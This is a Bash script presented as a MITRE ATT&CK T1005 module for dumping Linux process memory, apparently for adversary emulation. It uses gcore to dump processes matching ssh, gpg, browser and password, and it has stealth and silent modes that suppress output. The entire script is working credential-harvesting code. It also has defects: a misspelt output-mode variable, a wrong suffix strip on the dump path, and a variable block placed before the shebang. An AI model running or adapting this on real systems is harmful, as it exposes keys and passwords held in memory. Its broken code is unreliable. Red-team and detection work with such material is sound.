
    # ===== VARIABLES ESSENTIELLES COLLECTION =====
    export T1005_012L_DEBUG_MODE="${T1005_012L_DEBUG_MODE:-false}"
    export T1005_012L_TIMEOUT="${T1005_012L_TIMEOUT:-300}"
    export T1005_012L_FALLBACK_MODE="${T1005_012L_FALLBACK_MODE:-real}"
    export T1005_012L_OUTPUT_FORMAT="${T1005_012L_OUTPUT_FORMAT:-json}"
    export T1005_012L_POLICY_CHECK="${T1005_012L_POLICY_CHECK:-true}"
    export T1005_012L_MAX_FILES="${T1005_012L_MAX_FILES:-200}"
    export T1005_012L_MAX_FILE_SIZE="${T1005_012L_MAX_FILE_SIZE:-1048576}"
    export T1005_012L_SCAN_DEPTH="${T1005_012L_SCAN_DEPTH:-3}"
    export T1005_012L_EXCLUDE_CACHE="${T1005_012L_EXCLUDE_CACHE:-true}"
    export T1005_012L_CAPTURE_DURATION="${T1005_012L_CAPTURE_DURATION:-60}"
    # ===== FIN VARIABLES COLLECTION =====

#!/bin/bash

# T1005.012l - Data from Local System: Process Memory Linux
# MITRE ATT&CK Enterprise - Collection Tactic (TA0009)
# ATOMIC ACTION: Extract process memory dumps ONLY
# Platform: Linux | Architecture: 4 orchestrators + auxiliary functions

# Critical dependencies verification
Check-CriticalDeps() { 
    for cmd in bash jq bc grep find stat ps gdb; do 
        command -v "$cmd" >/dev/null || { 
            [[ "${T1005_012L_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] Missing dependency: $cmd"; exit 1; 
        }
    done
}

# Environment variables loading
Load-EnvironmentVariables() {
    export T1005_012L_OUTPUT_BASE="${T1005_012L_OUTPUT_BASE:-./mitre_results}"
    export T1005_012L_TIMEOUT="${T1005_012L_TIMEOUT:-300}"
    export T1005_012L_OUTPUT_MODE="${T1005_012L_OUTPUT_MODE:-simple}"
    export T1005_012L_SILENT_MODE="${T1005_012L_SILENT_MODE:-false}"
    export T1005_012L_MAX_PROCESSES="${T1005_012L_MAX_PROCESSES:-10}"
    
    export T1005_012L_TARGET_PROCESSES="${T1005_012L_TARGET_PROCESSES:-auto}"
    export T1005_012L_PROCESS_PATTERNS="${T1005_012L_PROCESS_PATTERNS:-ssh,gpg,browser,password}"
    export T1005_012L_MAX_DUMP_SIZE="${T1005_012L_MAX_DUMP_SIZE:-104857600}"
    export T1005_012L_DUMP_METHOD="${T1005_012L_DUMP_METHOD:-gcore}"
    export T1005_012L_INCLUDE_THREADS="${T1005_012L_INCLUDE_THREADS:-false}"
}

# System preconditions validation
Validate-SystemPreconditions() {
    [[ -z "$T1005_012L_OUTPUT_BASE" ]] && { [[ "${T1005_012L_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] T1005_012L_OUTPUT_BASE not set"; return 1; }
    [[ ! -w "$(dirname "$T1005_012L_OUTPUT_BASE")" ]] && { [[ "${T1005_012L_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] Output directory not writable"; return 1; }
    
    # Check if we have sufficient privileges for memory dumps
    if [[ $(id -u) -ne 0 ]]; then
        [[ "${T1005_012L_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[WARNING] Root privileges not available - will attempt user-mode collection" >&2
        export T1005_012L_USER_MODE="true"
    else
        export T1005_012L_USER_MODE="false"
    fi
    
    return 0
}

# Output structure initialization
Initialize-OutputStructure() {
    local timestamp=$(date +%Y%m%d_%H%M%S)
    export COLLECTION_DIR="$T1005_012L_OUTPUT_BASE/T1005_012l_process_memory_$timestamp"
    mkdir -p "$COLLECTION_DIR"/{memory_dumps,metadata} 2>/dev/null || return 1
    chmod 700 "$COLLECTION_DIR" 2>/dev/null
    echo "$COLLECTION_DIR"
}

# Process memory dump collection
Collect-ProcessMemory() {
    local pid="$1" collection_dir="$2" process_name="$3"
    
    [[ ! -d "/proc/$pid" ]] && return 1
    
    local safe_name="memdump_${process_name}_${pid}_$(date +%s)"
    local dump_path="$collection_dir/memory_dumps/$safe_name.core"
    
    # Check if we can access this process
    if [[ "$T1005_012L_USER_MODE" == "true" ]]; then
        # In user mode, only collect from our own processes
        if [[ "$(stat -c %u /proc/$pid 2>/dev/null)" != "$(id -u)" ]]; then
            [[ "$T1005_012L_SILENT_MODE" != "true" ]] && echo "  ⚠️  Skipping PID $pid (not owned by current user)" >&2
            return 1
        fi
    fi
    
    if command -v gcore >/dev/null 2>&1; then
        if gcore -o "${dump_path%_core}" "$pid" >/dev/null 2>&1; then
            local file_size=$(stat -c%s "$dump_path" 2>/dev/null || echo 0)
            [[ $file_size -gt $T1005_012L_MAX_DUMP_SIZE ]] && { rm -f "$dump_path"; return 1; }
            
            echo "$dump_path:$file_size"
            [[ "$T1005_012L_SILENT_MODE" != "true" ]] && echo "  + Dumped: PID $pid ($file_size bytes)" >&2
            return 0
        fi
    fi
    
    # Fallback: collect process info instead of memory dump
    if [[ "$T1005_012L_USER_MODE" == "true" ]]; then
        local info_file="$collection_dir/memory_dumps/${safe_name}.info"
        {
            echo "Process: $process_name (PID: $pid)"
            echo "Status: $(cat /proc/$pid/status 2>/dev/null | head -5 | grep -E "State|VmSize|VmRSS" || echo "Status: unavailable")"
            echo "Command: $(cat /proc/$pid/cmdline 2>/dev/null | tr '\0' ' ' || echo "Command: unavailable")"
            echo "Collection time: $(date)"
        } > "$info_file" 2>/dev/null
        
        local file_size=$(stat -c%s "$info_file" 2>/dev/null || echo 0)
        echo "$info_file:$file_size"
        [[ "$T1005_012L_SILENT_MODE" != "true" ]] && echo "  ⚠️  Collected process info instead of memory dump for PID $pid" >&2
        return 0
    fi
    
    return 1
}

# Target process identification
Get-TargetProcesses() {
    if [[ "$T1005_012L_TARGET_PROCESSES" == "auto" ]]; then
        IFS=',' read -ra patterns <<< "$T1005_012L_PROCESS_PATTERNS"
        
        for pattern in "${patterns[@]}"; do
            pattern=$(echo "$pattern" | xargs)
            ps -eo pid,comm --no-headers | grep -i "$pattern" | while read -r pid comm; do
                echo "$pid:$comm"
            done
        done
    else
        IFS=',' read -ra target_pids <<< "$T1005_012L_TARGET_PROCESSES"
        for pid in "${target_pids[@]}"; do
            pid=$(echo "$pid" | xargs)
            if [[ -d "/proc/$pid" ]]; then
                local comm=$(cat "/proc/$pid/comm" 2>/dev/null || echo "unknown")
                echo "$pid:$comm"
            fi
        done
    fi
}

# System metadata collection
Collect-SystemMetadata() {
    local collection_dir="$1"
    echo "$(uname -a)" > "$collection_dir/metadata/system_info.txt"
    echo "$(id)" > "$collection_dir/metadata/user_context.txt"
    echo "$(pwd)" > "$collection_dir/metadata/working_dir.txt"
}

# Execution message logging
Log-ExecutionMessage() {
    local message="$1"
    # Silent in stealth mode or when T1005_012L_SILENT_MODE is true
    [[ "$T1005_012L_SILENT_MODE" != "true" && "${T1005_012L_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "$message" >&2
}

# Simple output generation
Generate-SimpleOutput() {
    local files_collected="$1" total_size="$2" collection_dir="$3"
    echo "PROCESS MEMORY EXTRACTION "
    echo "Dumps: $files_collected"
    echo "Size: $total_size bytes"
    echo "Complete"
}

# Debug output generation
Generate-DebugOutput() {
    local files_collected="$1" total_size="$2" collection_dir="$3"
    local json_output=$(cat << EOF
{
    "@timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
    "technique": "T1005.012l",
    "results": {
        "dumps_collected": $files_collected,
        "total_size_bytes": $total_size,
        "collection_directory": "$collection_dir"
    }
}
EOF
)
    echo "$json_output" > "$collection_dir/metadata/results.json"
    [[ "$T1005_012L_SILENT_MODE" != "true" ]] && echo "$json_output"
}

# Stealth output generation
Generate-StealthOutput() {
    local files_collected="$1"
    echo "$files_collected" > /dev/null 2>&1
}

# None output generation
Generate-NoneOutput() {
    : # No output
}
# 4 MAIN ORCHESTRATORS (10-20 lines each)
# Function 1: Configuration (10-20 lines) - Orchestrator
Get-Configuration() {
    Check-CriticalDeps || exit 1
    Load-EnvironmentVariables
    Validate-SystemPreconditions || exit 1
    
    local collection_dir
    collection_dir=$(Initialize-OutputStructure) || exit 1
    
    echo "$collection_dir"
}

# Function 2: Atomic Action (10-20 lines) - Orchestrator
Invoke-MicroTechniqueAction() {
    local collection_dir="$1"
    local collected_files=() total_size=0 file_count=0
    
    Log-ExecutionMessage "[INFO] Extracting process memory..."
    
    # ATOMIC ACTION: Orchestration of auxiliary functions
    local target_processes
    target_processes=($(Get-TargetProcesses))
    
    for process_info in "${target_processes[@]}"; do
        IFS=':' read -r pid comm <<< "$process_info"
        
        if result=$(Collect-ProcessMemory "$pid" "$collection_dir" "$comm"); then
            IFS=':' read -r file_path file_size <<< "$result"
            collected_files+=("$file_path")
            total_size=$((total_size + file_size))
            ((file_count++))
            [[ $file_count -ge ${T1005_012L_MAX_PROCESSES:-10} ]] && break
        fi
    done
    
    Collect-SystemMetadata "$collection_dir"
    echo "$file_count:$total_size:$(IFS=,; echo "${collected_files[*]}")"
}

# Function 3: Output (10-20 lines) - Orchestrator
Write-StandardizedOutput() {
    local collection_dir="$1" files_collected="$2" total_size="$3"
    
    case "${TT1005_012L_OUTPUT_MODE:-simple}" in
        "simple")  Generate-SimpleOutput "$files_collected" "$total_size" "$collection_dir" ;;
        "debug")   Generate-DebugOutput "$files_collected" "$total_size" "$collection_dir" ;;
        "stealth") Generate-StealthOutput "$files_collected" ;;
        "none")    Generate-NoneOutput ;;
    esac
}

# Function 4: Main (10-15 lines) - Chief Orchestrator
Main() {
    trap 'echo "[INTERRUPTED] Cleaning up..."; exit 130' INT TERM
    
    # Load environment variables in main context
    Load-EnvironmentVariables

    local collection_dir
    collection_dir=$(Get-Configuration) || exit 2
    
    local results
    results=$(Invoke-MicroTechniqueAction "$collection_dir") || exit 1
    
    IFS=':' read -r files_collected total_size _ <<< "$results"
    Write-StandardizedOutput "$collection_dir" "$files_collected" "$total_size"
    
    Log-ExecutionMessage "[SUCCESS] Completed: $files_collected dumps collected"
    exit 0
}

# Execute
Main "$@"